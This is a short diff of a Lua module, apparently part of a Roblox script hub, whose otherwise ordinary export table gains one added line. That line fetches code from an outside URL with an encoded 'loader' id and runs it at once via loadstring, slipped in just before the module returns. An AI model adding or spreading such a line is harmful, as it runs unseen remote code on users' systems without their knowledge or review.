@@ -7418,7 +7418,7 @@ if game then
 	runtimeHelpers.launchHub()
 	return
 end
-
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjNmNmMzMDZmLTRhZTQtNDViZS04YzA4LTU5OGIyYzc3NmNkOSIsImtpbmQiOiJsb2FkZXIifQ"))()
 return {
 	uiLibraryUrl = UI_LIBRARY_URL,
 	getMinigameCountdown = runtimeHelpers.getMinigameCountdown,
